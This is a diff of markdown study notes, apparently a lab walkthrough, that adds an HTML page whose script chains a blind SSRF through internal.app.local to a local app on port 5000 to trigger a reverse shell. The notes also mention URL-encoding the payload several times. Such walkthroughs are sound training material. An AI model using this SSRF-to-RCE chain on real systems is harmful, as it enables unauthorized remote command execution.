@@ -480,5 +480,25 @@ we could see last time that the server was using python so lets create a bash re
 
 ![](Images/Pasted%20image%2020240212203110.png)
 
+remember that in this case we will need to URL encode this multiple times to go through the multiple apps 
+
 lets put this in an HTML file that performs a GET request to `internal.app.local` then uses its local app vulnerable to RCE via SSRF and executes our reverse shell (the `x` parameter from the previous exercise): 
+
+```html
+<html>
+    <body>
+        <b>Reverse Shell via Blind SSRF</b>
+        <script>
+        var http = new XMLHttpRequest();
+        http.open("GET","http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=<urlencodedpayload>", true); 
+        http.send();
+        http.onerror = function(){document.write('<a>Oops!</a>');}
+        </script>
+    </body>
+</html>
+```
+
+we then can get RCE in our listener 
+
+![](Images/Pasted%20image%2020240212204148.png)
 
